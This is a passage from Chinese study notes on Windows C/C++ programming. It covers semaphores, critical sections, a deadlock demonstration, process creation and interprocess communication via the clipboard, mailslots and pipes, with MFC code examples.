- 触发状态【有信号状态】：表示有可用资源；

- 未触发状态【无信号状态】：表示没有可用资源。

<span style="background:#5de420;">工作原理：</span>

- 以一个停车场是运作为例。假设停车场只有三个车位，一开始三个车位都是空的。

- 这时如果同时来了五辆车，看门人允许其中三辆不受阻碍的进入，然后放下车拦，剩下的车则必须在入口等待，此后来的车也都不得不在入口处等待。
- 这时，有一辆车离开停车场，看门人得知后，打开车拦，放入一辆；如果又离开两辆，则又可以放入两辆，如此往复。
- 这个停车系统中，每辆车就好比一个线程，看门人就好比一个信号量，看门人限制了可以活动的线程。假如里面依然是三个车位，但是看门人改变了规则，要求每次只能停两辆车，那么一开始进入两辆车，后面得等到有车离开才能有车进入，但是得保证最多停两辆车。
- 对于`Semaphore`而言，就如同一个看门人，限制了可活动的线程数。



<span style="background:#5de420;">信号量的组成</span>

- ① 计数器：该内核对象被使用的次数

- ② **最大资源数量**：标识信号量可以控制的最大资源数量（带符号的32位）

- ③ **当前资源数量**：标识当前可用资源的数量（带符号的32位）
  - 即表示**当前开放资源的个数**（注意**不是剩下资源的个数**），**只有开放的资源才能被线程所申请**。
  - 但这些开放的资源不一定被线程占用完。比如，当前开放5个资源，而只有3个线程申请，则还有2个资源可被申请，但如果这时总共是7个线程要使用信号量，显然开放的资源5个是不够的。这时还可以再开放2个，直到达到最大资源数量。



<span style="background:#5de420;">信号量的规则如下：</span>

1. 如果当前资源计数大于0，那么信号量处于触发状态(有信号状态)，表示有可用资源。
2. 如果当前资源计数等于0，那么信号量属于未触发状态（无信号状态），表示没有可用资源。
3. 系统绝对不会让当前资源计数变为负数
4. 当前资源计数绝对不会大于最大资源计数

 ![img](W-7-3.png)

 

<span style="background:#5de420;">信号量与互斥量的区别：</span>

- 信号量允许多个线程在同一时刻访问同一资源，但是需要限制在同一时刻访问此资源的最大线程数目。
- 信号量对象对线程的同步方式与前面几种方法不同，**信号允许多个线程同时使用共享资源**。

<br>

**信号量API**

```C++
//创建信号量
HANDLE WINAPI CreateSemaphoreW(
    _In_opt_ LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,  // Null 安全属性
	_In_ LONG lInitialCount,  //初始化时，共有多少个资源是可以用的。 0：未触发状态（无信号状态），表示没有可用资源
    _In_ LONG lMaximumCount,  //能够处理的最大的资源数量   3
    _In_opt_ LPCWSTR lpName   //NULL 信号量的名称
);

//增加信号量
WINAPI ReleaseSemaphore(
    _In_ HANDLE hSemaphore,   //信号量的句柄
    _In_ LONG lReleaseCount,   //将lReleaseCount值加到信号量的当前资源计数上面 0-> 1
    _Out_opt_ LPLONG lpPreviousCount  //当前资源计数的原始值
);

//关闭句柄
CloseHandle(
    _In_ _Post_ptr_invalid_ HANDLE hObject
);
```



**示例：**实现先后循环输入数字，并求和

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h>
#pragma warning(disable:4996)

// 实现先循环输入数字，并求和
unsigned WINAPI Read(void* arg);
unsigned WINAPI Accu(void* arg);

static HANDLE semOne;
static HANDLE semTwo;
static int num;

int main(int argc, char* argv[])
{
	HANDLE hThread1, hThread2;

	//semOne 没有可用资源，只能表示0或者1的二进制信号量  无信号
	//semTwo 有可用资源，有信号状态   有信号
	semOne = CreateSemaphore(NULL, 0, 1, NULL);
	semTwo = CreateSemaphore(NULL, 1, 1, NULL);
	
	hThread1 = (HANDLE)_beginthreadex(NULL, 0, Read, NULL, 0, NULL);
	hThread2 = (HANDLE)_beginthreadex(NULL, 0, Accu, NULL, 0, NULL);

	WaitForSingleObject(hThread1, INFINITE);
	WaitForSingleObject(hThread2, INFINITE);

	CloseHandle(semOne);
	CloseHandle(semTwo);
	system("pause");
	return 0;
}

unsigned WINAPI Read(void* arg)
{
	int i;
	for (i = 0; i < 5; i++)
	{
		fputs("Input num: ", stdout);
		printf("begin read\n");
		//等待内核对象semTwo的信号，如果有信号，继续执行；如果没有信号，等待
		WaitForSingleObject(semTwo, INFINITE);
		printf("beginning read\n");
		scanf("%d", &num);
		ReleaseSemaphore(semOne, 1, NULL);
	}
	return 0;
}
unsigned WINAPI Accu(void* arg)
{
	int sum = 0, i;
	for (i = 0; i < 5; i++)
	{
		printf("begin Accu\n");
		//等待内核对象semOne的信号，如果有信号，继续执行；如果没有信号，等待
		WaitForSingleObject(semOne, INFINITE);
		printf("beginning Accu\n");
		sum += num;
		printf("sum = %d \n", sum);
		ReleaseSemaphore(semTwo, 1, NULL);
	}
	printf("Result: %d \n", sum);
	return 0;
}

```



<br>

## 7.4 线程同步之关键代码段

关键代码段，也称为临界区，工作在**用户方式**下【用户态】。

- 它是指一个小代码段，在代码能够执行前，它必须独占对某些资源的访问权。
- 通常把多线程中访问同一种资源的那部分代码当做关键代码段。

**使用步骤：**

1. 初始化关键代码段：调用`InitializeCriticalSection`函数初始化一个关键代码段。

   ```c++
   InitializeCriticalSection(
       _Out_ LPCRITICAL_SECTION lpCriticalSection
   );
   //该函数只有一个指向CRITICAL_SECTION结构体的指针。
   //在调用InitializeCriticalSection函数之前，首先需要构造一个CRITICAL_SECTION结构体类型的对象
   //然后将该对象的地址传递给InitializeCriticalSection函数。
   ```

   

2. 进入关键代码段：调用`EnterCriticalSection`函数，以获得指定的临界区对象的所有权。

   ```c++
   VOID WINAPI EnterCriticalSection(
       _Inout_ LPCRITICAL_SECTION lpCriticalSection
   );
   //该函数等待指定的临界区对象的所有权，如果该所有权赋予了调用线程，则该函数就返回；
   //否则该函数会一直等待，从而导致线程等待。
   ```

   

3. 退出关键代码段： 线程使用完临界区所保护的资源之后，需要调用`LeaveCriticalSection`函数，释放指定的临界区对象的所有权。之后，其他想要获得该临界区对象所有权的线程就可以获得该所有权，从而进入关键代码段，访问保护的资源。

   ```c++
   VOID WINAPI LeaveCriticalSection(
       _Inout_ LPCRITICAL_SECTION lpCriticalSection
   );
   ```

   

4. 删除临界区：当临界区不再需要时，可以调用`DeleteCriticalSection`函数释放该对象，该函数将释放一个没有被任何线程所拥有的临界区对象的所有资源。

   ```c++
   WINBASEAPI VOID WINAPI DeleteCriticalSection(
       _Inout_ LPCRITICAL_SECTION lpCriticalSection
   );
   ```

   

**示例：卖票系统**

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h> 


int iTickets = 1000;//共5000张票
CRITICAL_SECTION g_cs;

// A窗口     B窗口

DWORD WINAPI SellTicketA(void* lpParam)
{
	while (1)
	{
		EnterCriticalSection(&g_cs);//进入临界区
		if (iTickets > 0)
		{
			//Sleep(1);
			iTickets--;
			printf("A remain %d\n", iTickets);
			LeaveCriticalSection(&g_cs);//离开临界区
		}
		else
		{
			LeaveCriticalSection(&g_cs);//离开临界区
			break;
		}
	}
	return 0;
}

DWORD WINAPI SellTicketB(void* lpParam)
{
	while (1)
	{
		EnterCriticalSection(&g_cs);//进入临界区
		if (iTickets > 0)
		{
			//Sleep(1);
			iTickets--;
			printf("B remain %d\n", iTickets);
			LeaveCriticalSection(&g_cs);//离开临界区
		}
		else
		{
			LeaveCriticalSection(&g_cs);//离开临界区
			break;
		}
	}
	return 0;
}


int main()
{
	HANDLE hThreadA, hThreadB;
	hThreadA = CreateThread(NULL, 0, SellTicketA, NULL, 0, NULL);  //引用计数:2
	hThreadB = CreateThread(NULL, 0, SellTicketB, NULL, 0, NULL);  //引用计数:2
	CloseHandle(hThreadA); //引用计数:1【当线程结束即退出】
	CloseHandle(hThreadB); //引用计数:1

	InitializeCriticalSection(&g_cs); //初始化关键代码段
	Sleep(20000);
	DeleteCriticalSection(&g_cs);//删除临界区

	system("pause");
	return 0;
}

```





<br>

## 7.5 线程死锁

死锁是指多个线程因竞争资源而造成的一种僵局【互相等待】。若无外力作用，这些进程都将无法向前推进。

**示例：**修改上节的买票系统【SellA先进入临界区A然后等待1s，此时线程切换，SellB率先抢占临界区B。至此，二者相互等待】

```c++
#include <stdio.h>
#include <windows.h>
#include <process.h> 

int iTickets = 5000;
CRITICAL_SECTION g_csA;
CRITICAL_SECTION g_csB;

// A窗口     B窗口

DWORD WINAPI SellTicketA(void* lpParam)
{
	while (1)
	{
		EnterCriticalSection(&g_csA);//进入临界区A
        printf("A\n");
		Sleep(1);
		EnterCriticalSection(&g_csB);//进入临界区B
		if (iTickets > 0)
		{
			Sleep(1);
			iTickets--;
			printf("A remain %d\n", iTickets);
			LeaveCriticalSection(&g_csB);//离开临界区B
			LeaveCriticalSection(&g_csA);//离开临界区A
		}
		else
		{
			LeaveCriticalSection(&g_csB);//离开临界区B
			LeaveCriticalSection(&g_csA);//离开临界区A
			break;
		}
	}
	return 0;
}

DWORD WINAPI SellTicketB(void* lpParam)
{
	while (1)
	{
		EnterCriticalSection(&g_csB);//进入临界区B
        printf("B\n");
		Sleep(1);
		EnterCriticalSection(&g_csA);//进入临界区A
		if (iTickets > 0)
		{
			Sleep(1);
			iTickets--;
			printf("B remain %d\n", iTickets);
			LeaveCriticalSection(&g_csA);//离开临界区A
			LeaveCriticalSection(&g_csB);//离开临界区B
		}
		else
		{
			LeaveCriticalSection(&g_csA);//离开临界区A
			LeaveCriticalSection(&g_csB);//离开临界区B
			break;
		}
	}
	return 0;
}


int main()
{
	HANDLE hThreadA, hThreadB;
	hThreadA = CreateThread(NULL, 0, SellTicketA, NULL, 0, NULL);  //2
	hThreadB = CreateThread(NULL, 0, SellTicketB, NULL, 0, NULL);  //2
	CloseHandle(hThreadA); //1
	CloseHandle(hThreadB); //1

	InitializeCriticalSection(&g_csA); //初始化关键代码段A
	InitializeCriticalSection(&g_csB); //初始化关键代码段B
	Sleep(5000);
	DeleteCriticalSection(&g_csA);//删除临界区
	DeleteCriticalSection(&g_csB);//删除临界区
	
	system("pause");
	return 0;
}
```

> 解决：避免死锁
>



<br>

## 7.6 各种线程同步的比较总结

`windows`线程同步的方式主要有四种：互斥对象`Mutex`、信号量`Semaphore`、事件对象`event`和关键代码段`criticalSection`。 

对于上面介绍的四种线程同步的方式，它们之间的区别如下所述：

​    ●  互斥对象和事件以及信号量都属于内核对象，利用内核对象进行线程同步。因此，速度较慢，但利用互斥对象和事件对象这样的内核对象，可以在**多个进程中的各个线程间**进行同步。

​    ●  关键代码段工作在用户方式下，同步速度较快；但在使用关键代码段时，很容易进入死锁状态，因为在等待进入关键代码段时无法设定超时值。

> 用户级别的同步：即关键代码段，只能本进程中进行同步。
>
> 内核级别的同步：互斥量/事件/信号量，可以跨进程同步。
>

通常，在编写多线程程序并需要实现线程同步时，首选关键代码段，由于它的使用比较简单，如果是在MFC程序中使用的话：

- 可以在类的构造函数Init中调用`InitializeCriticalSection`函数；
- 在该类的析构函数中调用`DeleteCriticalSection`函数
- 在所需保护的代码前面调用`EnterCriticalSection`函数
- 在访问完所需保护的资源后，调用`LeaveCriticalSection`函数。

可见，关键代码段在使用上是非常方便的，但有几点需要注意：

- 在程序中调用了`EnterCriticalSection`后，要相应的调用`LeaveCriticalSection`函数，否则其他等待该临界区对象所有权的线程将无法执行。

- 如果访问关键代码段时，使用了多个临界区对象，就要注意防止线程死锁的发生。
- 另外，如果需要在多个进程间的各个线程间实现同步的话，可以使用互斥对象和事件对象或者信号量。

| 比较                 | 互斥量  Mutex                                                | 事件对象  Event                                              | 信号量对象  Semaphore                                        | 关键代码段  Criticalsection                                  |
| -------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |
| 是否为内核对象       | 是                                                           | 是                                                           | 是                                                           | 否                                                           |
| 速度                 | 较慢                                                         | 较慢                                                         | 慢                                                           | 快                                                           |
| 多个进程中的线程同步 | 支持                                                         | 支持                                                         | 支持                                                         | 不支持                                                       |
| 发生死锁             | 否                                                           | 否                                                           | 否                                                           | 是                                                           |
| 组成                 | 一个线程ID；用来标识哪个线程拥有该互斥量；一个计数器：用来指明该线程用于互斥对象的次数 | 一个使用计数；一个布尔值：用来标识该事件是自动重置还是人工重置；一个布尔值：标识该事件处于有信号状态还是无信号状态 | 一个使用计数；  最大资源数；  标识当前可用的资源数           | 一个小代码段；  在代码能够执行前，必须占用对某些资源的访问权 |
| 相关函数             | CreateMutex  WaitForSingleObjects  //被保护的内容  ReleaseMutex | CreateEvent  ResetEvent  WaitforSingleobject  //保护内容  SetEvent | CreateSemaphore  WaitForsingleobject  //被保护的内容  ReleaseSemaPhore | InitialCriticalSection  EnterCritionSection  //被保护的内容  LeaveCritialSection  DeleteCritialSection |
| 注意事项             | 谁拥有互斥对象，谁释放；  如果多次在同一个线程中请求同一个互斥对象，需要多次调用releaseMutex | 为了实现线程间的同步，不应该使用人工重置，应该把第二个参数设置false；设置为自动重置 | 它允许多个线程在同一时间访问同一个资源；但是需要限制访问此资源的最大线程数目； | 防止死锁：使用多个关键代码段变量的时候                       |
| 类比                 | 一把钥匙                                                     | 钥匙（自动/人工）                                            | 停车场和保安                                                 | 电话亭                                                       |

 

🔺什么是线程安全？

假如你的代码在多线程执行和单线程执行永远是完全一样的结果，那么你的代码是线程安全的。

> 陈硕《muduo》 





<br>

# 八 进程

## 8.1 基本概念：进程和子进程

📋程序、进程：正在运行的程序

- 程序：是计算机指令的集合，它以文件的形式存储在磁盘上；
- 进程：通常被定义为一个正在运行的程序的实例，是一个程序在其自身的地址空间中的一次执行活动。
  - 一个程序可以对应多个进程；
  - 进程是资源申请、调度和独立运行的单位。因此，它使用系统中的运行资源；
  - 而程序不能申请系统资源，不能被系统调度也不能作为独立运行的单位，因此它不占系统运行资源。

> 一般Windows程序员不适用任务管理器，而是使用 `procexp64.exe` 【`Process Explorer`】替代，可以显示更多任务信息。

📋进程组成：

1. 操作系统用来管理进程的内核对象
   - 内核对象是操作系统用来存放关于进程的统计信息的地方；
   - 内核对象是在操作系统内部，分配的一个内存块，该内存块是一种数据结构，其成员负责维护该对象的各种信息。
2. 地址空间：它包含所有可执行模块或DLL模块的代码和数据。另外，它也包含动态内存分配的空间，例如线程的栈和堆分配空间。

📋需要注意的另一点：<span style="background:#5de420;">进程从来不执行任何东西，它只是纯粹的容器。</span>若要完成某项操作，它必须拥有一个在它的环境中运行的线程，此线程负责执行包含在进程的地址空间的中的代码。也就是说，真正完成代码执行的是线程，而进程只是纯粹的容器，或者说是线程的执行环境。

- 子进程，还是一个进程；子进程指的是由另一进程【对应的父进程】所创建的进程；
- 单任务的同步机制：线程，子进程，需要保护地址空间；
- 子进程的线程既可以在父进程终止之后执行我们的代码；也可以在父进程运行的过程中执行代码。

 

<br>

## 8.2 如何创建一个进程

```c++
// CreateProcess函数:创建成功返回TRUE
BOOL CreateProcessW(
    _In_opt_ LPCWSTR lpApplicationName,//该字符串可以指定要执行的模块的完整路径和文件名
	_Inout_opt_ LPWSTR lpCommandLine,  //命令行

    //有Attributes必然是内核对象
    //该结构确定子进程是否可以继承返回到新进程对象的句柄。
    //如果lpProcessAttributes为【默认】NULL，则不能继承该句柄
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
    
    //该结构确定子进程是否可以继承返回到新线程对象的句柄。
    //如果lpThreadAttributes为NULL，则不能继承该句柄
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,

    //如果此参数为TRUE，则新进程将继承调用进程中的每个可继承句柄;
    //如果参数为FALSE，则不会继承句柄
    //请注意，继承的句柄与原始句柄具有相同的值和访问权限
	_In_ BOOL bInheritHandles,

    // 控制优先级类别和流程创建的标志 CREATE_NEW_CONSOLE
    _In_ DWORD dwCreationFlags,
    
    // 指向新进程的环境块的指针。如果此参数为【默认】NULL，则新进程将使用调用进程的环境
	_In_opt_ LPVOID lpEnvironment,

    _In_opt_ LPCWSTR lpCurrentDirectory,// 进程当前目录的完整路径
    _In_ LPSTARTUPINFOW lpStartupInfo, //设置扩展属性
    _Out_ LPPROCESS_INFORMATION lpProcessInformation //该结构接收有关新进程的标识信息
)
```

> 在线查windows文档：微软的[帮助文档网址](https://learn.microsoft.com/zh-cn/)
>

```c++
#include <windows.h>
#include <stdio.h>
#include <tchar.h>

//拉起谷歌浏览器

int RunExe()
{
	//TCHAR szCommandLine[] = L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe";//注意w_char的写法
	//w_char带参数
	TCHAR szCommandLine[] = L"\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" http://www.baidu.com/";
	//TCHAR szCommandLine[] = _T("\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" http://www.baidu.com/");
	//TCHAR szCommandLine[] = L"cmd.exe";

	STARTUPINFOW strStartupInfo;
	memset(&strStartupInfo, 0, sizeof(STARTUPINFOW));
	strStartupInfo.cb = sizeof(strStartupInfo);//默认写法

	PROCESS_INFORMATION szProcessInformation;
	memset(&szProcessInformation, 0, sizeof(szProcessInformation));

	int bRet = CreateProcess(
		NULL,//该字符串可以指定要执行的模块的完整路径和文件名
		szCommandLine,//命令行
		NULL,//子进程不可以继承返回到【新进程对象】的句柄
		NULL,//子进程不可以继承返回的【新线程对象】的句柄
		FALSE,//新进程不继承调用进程中的每个可继承句柄
		CREATE_NEW_CONSOLE,//选项：创建新的控制台应用
		NULL,//新进程将使用调用进程的环境
		NULL,// 进程当前目录的完整路径
		&strStartupInfo,//设置扩展属性
		&szProcessInformation//接收有关新进程的标识信息
	);
	if (bRet)
	{
		printf("Create Success bRet\n");
		WaitForSingleObject(szProcessInformation.hProcess, 3000);//等待是否创建成功
		printf("hProcess=%d\n", szProcessInformation.hProcess);//228
		printf("hThread=%d\n", szProcessInformation.hThread);//224
		CloseHandle(szProcessInformation.hProcess);
		CloseHandle(szProcessInformation.hThread);
		szProcessInformation.dwProcessId = 0;
		szProcessInformation.dwThreadId = 0;
		szProcessInformation.hThread = NULL;
		szProcessInformation.hProcess = NULL;

	}
	else
	{
		printf_s("Create Failed bRet = %d\n", bRet);
		printf_s("errorcode = %d\n", GetLastError());
	}
	return bRet;
}

int main()
{
	printf("This is Chrome!\n");
	RunExe();

	system("pause");
	return 0;
}
```



<br>

## 8.3 进程间通信方式

1. `socket`编程【IP和端口 | `server` `client`】
2. 剪切板【剪切板的内核对象】
3. 邮槽【邮槽的内核对象，较原始，目前用的少】
4. 匿名管道【无名管道】
5. 命名管道
6. Copy_data findwindows wm_copydata 很多书籍都没有  消息

Sendmessage



<br>

## 8.4 进程间通信方式之剪切板

> 第一次接触MFC，简单记录入门用法

1. 首先获取MFC开发包【工具 | 获取工具和功能 | 单个组件：搜索MFC，选择最新`v143`生成工具的`C++ MFC`，勾选下载时安装，点击修改】，然后创建MFC应用，选择基于对话框的应用。
2. 设置该项目为启动项，编译运行出现对话框。
3. 点击资源文件中的`rc`文件，出现资源视图，选择【`MFCApplication_clip.rc` | `Dialog` | `IDD_MFCAPPLICATION_CLIP_DIALOG`】，即可使用工具箱编辑对话框。

其中，用到的技巧有以下：

- 选中后按`Delete`键，删除所选控件；
- 选中后按`Ctrl`键，复制所选控件；
- 选中控件，右键属性可编辑
  - 修改`Caption`【描述文字】字段为【发送 | 接受】
  - 修改四个控件的ID字段
- 双击控件，自动实现事件代码

![](W-8-1.png)

<br>

在以下代码中，系统维护管理的一块内存区域，用于发送和接受。

```c++
//在MFCApplication_clipDlg.cpp中
void CMFCApplicationclipDlg::OnBnClickedButtonSend()
{
	// TODO: 在此添加控件通知处理程序代码
	//1 打开剪切板
	if (OpenClipboard())//返回打开结果
	{
		//2 清空剪切板
		EmptyClipboard();
		char* szSendBuf;

		//3 获取编辑框的内容【下面三行是在UNICODE字符集下】
		//CStringW strSendW;//CString
		//GetDlgItemText(IDC_BUTTON_SEND, strSendW); //此函数只支持UNICODE
		//CStringA strSend = (CStringA)strSendW;
		CStringA strSend;
		GetDlgItemText(IDC_EDIT_SEND, strSend);

		//4 分配内存对象,内存对象的句柄就是hClip
		HANDLE hClip = GlobalAlloc(GMEM_MOVEABLE, strSend.GetLength() + 1);

		//5 将剪切板加锁
		szSendBuf = (char*)GlobalLock(hClip);
		strcpy(szSendBuf, strSend);
		GlobalUnlock(hClip);

		//6 将数据放入剪切板
		SetClipboardData(CF_TEXT, hClip);

		//7 关闭剪切板
		CloseClipboard();
	}
}

#include <stdio.h>
void CMFCApplicationclipDlg::OnBnClickedButtonRecv()
{
	// TODO: 在此添加控件通知处理程序代码
	//1 打开剪切板
	if (OpenClipboard())//返回打开结果
	{
		//2 判断剪切板是否可用
		if (IsClipboardFormatAvailable(CF_TEXT))
		{
			char* szRecvBuf;
			//3 取得剪切板内存对象HANDLE
			HANDLE hclip = GetClipboardData(CF_TEXT);

			//4 加锁读取【锁定全局内存对象并返回指向对象内存块的第一个字节的指针】
			szRecvBuf = (char*)GlobalLock(hclip);
			//USES_CONVERSION;
			//用于字符集转换的宏【此处开始修改字符集为多字节字符集】

			//6 将数据放入编辑框
			SetDlgItemTextA(IDC_EDIT_RECV, szRecvBuf);
			//7 解锁
			GlobalUnlock(hclip);
			//8 关闭剪切板
			CloseClipboard();
		}
	}
}
```



<br>

## 8.5 进程间通信方式之邮槽

邮槽是早期的进程通信方式，目前已经很少用。【邮槽的内核对象】

- 使用邮槽通信的进程分为服务端和客户端。
- 邮槽由服务端创建，在创建时需要指定邮槽名，创建后服务端得到邮槽的句柄。
- 在邮槽创建后，客户端可以通过邮槽名打开邮槽，在获得句柄后可以向邮槽写入消息。

需要注意的是：

- 邮槽通信是单向的，只有服务端才能从邮槽中读取消息，客户端只能写入消息。消息是先入先出的【客户端先写入的消息，在服务端先被读取】。
- 通过邮槽通信的数据可以是任意格式的，但是一条消息不能大于`424`字节。
- 邮槽除了在本机内进行进程间通信外，在主机间也可以通信。但是在主机间进行邮槽通信，数据通过网络传播时使用的是数据报协议【UDP】，所以是一种不可靠的通信。通过网络进行邮槽通信时，客户端必须知道服务端的主机名或域名。 

 <br>

**示例：**首先创建一个MFC服务端，然后在同一个解决方案中创建新的MFC项目客户端，并实现邮槽通信

> 点击服务端接收，创建邮槽并无限等待；再点击客户端发送，服务端接到消息，触发`MessageBox`。

![](W-8-2.png)

📋服务端

```c++
void CMFCAppmailslotserverDlg::OnBnClickedRecv()
{
	// TODO: 在此添加控件通知处理程序代码
	//    "\\\\.\\mailslot\\Mymailslot    \\.\mailslot\Mymailslot 
	//  1  创建一个邮槽
	LPCTSTR szSlotName = TEXT("\\\\.\\mailslot\\Mymailslot");
	HANDLE hSlot = CreateMailslot(
		szSlotName,
		0,                             // no maximum message size 
		MAILSLOT_WAIT_FOREVER,         // no time-out for operations 
		NULL); // default security
	
	if (hSlot == INVALID_HANDLE_VALUE)//创建不成功
	{
		//注意MFC的报错日志写法！
		TRACE("CreateMailslot failed with %d\n", GetLastError());
		return;
	}

	//2 读数据
	char szBuf[100] = { 0 };
	DWORD dwRead;//实际读到的长度
	if (!ReadFile(hSlot, szBuf, 100, &dwRead, NULL))
	{
		//此处修改两个项目【server|client】为多字节项目，否则不支持直接的字符串
		MessageBox("Read Failed!");
		CloseHandle(hSlot);
		return;
	}
	//3 显示数据
	TRACE("############## dwRead = %d ########\n", dwRead);
	MessageBox(szBuf);
	CloseHandle(hSlot);
}
```

📋客户端

```c++
void CMFCAppmailslotclientDlg::OnBnClickedSend()
{
	// TODO: 在此添加控件通知处理程序代码
	// 创建一个文件句柄
	LPCTSTR szSlotName = TEXT("\\\\.\\mailslot\\Mymailslot");
	HANDLE hMailSlot =
		CreateFile(szSlotName, FILE_GENERIC_WRITE,
			FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hMailSlot == INVALID_HANDLE_VALUE)
	{
		TRACE("CreateFile failed with %d\n", GetLastError());
		return;
	}

	// 写入数据
	char szBuf[100] = { "Mail Slot coming"};
	DWORD dwWrite;
	if (!WriteFile(hMailSlot, szBuf, strlen(szBuf) + 1, &dwWrite, NULL))
	{
		//MessageBox(_T("写入数据失败"));//若使用UNIDCODE字符集
		MessageBox("写入数据失败");
		CloseHandle(hMailSlot);
		return;
	}
	CloseHandle(hMailSlot);
}
```



<br>

## 8.6 进程间通信方式之匿名管道

匿名管道是一个没有命名的单向管道，本质上就是一个共享的内存区域。

需要注意的是：

- 通常用来在父进程和子进程之间通信；
- 只能实现本地两个进程之间的通信；
- 不能实现网络通信。



```c++
//创建匿名管道，本质上创建了两个单向管道
bool CreatePipe(
    _Out_ PHANDLE hReadPipe,  //该变量接收管道的读取句柄
    _Out_ PHANDLE hWritePipe,// 该变量接收管道的写句柄
    _In_opt_ LPSECURITY_ATTRIBUTES lpPipeAttributes,//NULL
    _In_ DWORD nSize  //管道缓冲区的大小 0:默认缓冲区大小
);
```

 

**示例：**【基于上一节的客户端服务端，服务端新增3个按钮，客户端新增两个按钮】在服务端可创建子进程【即客户端】，然后创建匿名管道。任意端点击发送，另一端接收。

![](W-8-3.png)

📋服务端

```c++
HANDLE hReadPipe;
HANDLE hWritePipe;

void CMFCAppmailslotserverDlg::OnBnClickedCreateProcess()
{
	// TODO: 在此添加控件通知处理程序代码
	//创建匿名管道
	SECURITY_ATTRIBUTES sa;
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
	{
		//MessageBox(_T("匿名管道创建失败"));
		MessageBox("匿名管道创建失败");
		return;
	}

	//创建子进程
	STARTUPINFO strStartupInfo; //用来指定新进程窗口如何显示【扩展属性】
	memset(&strStartupInfo, 0, sizeof(strStartupInfo));
	strStartupInfo.cb = sizeof(strStartupInfo);
	strStartupInfo.dwFlags = STARTF_USESTDHANDLES;
	strStartupInfo.hStdInput = hReadPipe;//用于接收数据的管道
	strStartupInfo.hStdOutput = hWritePipe;//用于发送数据的管道
	strStartupInfo.hStdError = GetStdHandle(STD_ERROR_HANDLE);

	PROCESS_INFORMATION szProcessInformation;
	memset(&szProcessInformation, 0, sizeof(szProcessInformation));

	int iRet = CreateProcess(
		//_T("MailSlotClient.exe"),//指定要执行的模块的完整路径和文件名
		"MFCApp_mailslot_client.exe",//此处指向客上一节的客户端
		NULL,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&strStartupInfo, //设置扩展属性
		&szProcessInformation//接收有关新进程的标识信息
	);
	if (iRet)
	{
		//创建成功
		CloseHandle(szProcessInformation.hProcess);
		CloseHandle(szProcessInformation.hThread);
		szProcessInformation.dwProcessId = 0;
		szProcessInformation.dwThreadId = 0;
		szProcessInformation.hThread = NULL;
		szProcessInformation.hProcess = NULL;
	}
	else
	{
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		hReadPipe = NULL;
		hWritePipe = NULL;
		//MessageBox(_T("创建子进程失败"));
		MessageBox("创建子进程失败");
		return;
	}

}


void CMFCAppmailslotserverDlg::OnBnClickedRecv2()
{
	// TODO: 接收
	char szBuf[100] = { 0 };
	DWORD dwRead;//实际读到的长度
	TRACE("Begin Read:\n");
	if (!ReadFile(hReadPipe, szBuf, 100, &dwRead, NULL))
	{
		//此处修改两个项目【server|client】为多字节项目，否则不支持直接的字符串
		MessageBox("Read Failed!");
		CloseHandle(hReadPipe);
		return;
	}
	//3 显示数据
	TRACE("############## dwRead = %d ########\n", dwRead);
	MessageBox(szBuf);
	//CloseHandle(hReadPipe);
}


void CMFCAppmailslotserverDlg::OnBnClickedSend2()
{
	// TODO: 发送
	char szBuf[100] = { "Unnamed Pipe coming from server" };
	DWORD dwWrite;
	if (!WriteFile(hWritePipe, szBuf, strlen(szBuf) + 1, &dwWrite, NULL))
	{
		//MessageBox(_T("写入数据失败"));//若使用UNIDCODE字符集
		MessageBox("写入数据失败");
		CloseHandle(hWritePipe);
		return;
	}
}
```

📋客户端

```c++
HANDLE hReadPipe;
HANDLE hWritePipe;

void CMFCAppmailslotclientDlg::OnBnClickedSendBtn()
{
	// TODO: 发送：写入数据
	hWritePipe = GetStdHandle(STD_OUTPUT_HANDLE);

	char szBuf[100] = { "Unnamed Pipe coming from client" };
	DWORD dwWrite;
	if (!WriteFile(hWritePipe, szBuf, strlen(szBuf) + 1, &dwWrite, NULL))
	{
		//MessageBox(_T("写入数据失败"));//若使用UNIDCODE字符集
		MessageBox("写入数据失败");
		CloseHandle(hWritePipe);
		return;
	}
	//CloseHandle(hWritePipe);
}

void CMFCAppmailslotclientDlg::OnBnClickedRecvBtn()
{
	// TODO: 接收
	hReadPipe = GetStdHandle(STD_INPUT_HANDLE);

	char szBuf[100] = { 0 };
	DWORD dwRead;//实际读到的长度
	TRACE("Begin Read:\n");
	if (!ReadFile(hReadPipe, szBuf, 100, &dwRead, NULL))
	{
		MessageBox("Read Failed!");
		CloseHandle(hReadPipe);
		return;
	}
	//3 显示数据
	TRACE("############## dwRead = %d ########\n", dwRead);
	MessageBox(szBuf);
}
```

> 
>

 

<br>

## 8.7 进程间通信方式之命名管道

与 `Socket` 相似，支持网络之间不同进程的通信，用于双向通信。

```c++
// 创建命名管道
HANDLE CreateNamedPipeA(
  LPCSTR      lpName,  //唯一的管道名称。 此字符串必须具有以下形式：\\.\pipe\pipename
  DWORD       dwOpenMode,	 //打开模式
  DWORD       dwPipeMode,	 //管道模式
  DWORD       nMaxInstances, //可为此管道创建的最大实例数
  DWORD       nOutBufferSize,//要为输出缓冲区保留的字节数
  DWORD       nInBufferSize, //要为输入缓冲区保留的字节数
  DWORD       nDefaultTimeOut,//超时处理
  LPSECURITY_ATTRIBUTES lpSecurityAttributes //安全属性
);

// 需要等待连接
BOOL ConnectNamedPipe(
  HANDLE       hNamedPipe,
  LPOVERLAPPED lpOverlapped
);

// 客户端尝试连接命名管道
WaitNamedPipe(szNamedPipeName, NMPWAIT_WAIT_FOREVER);
```



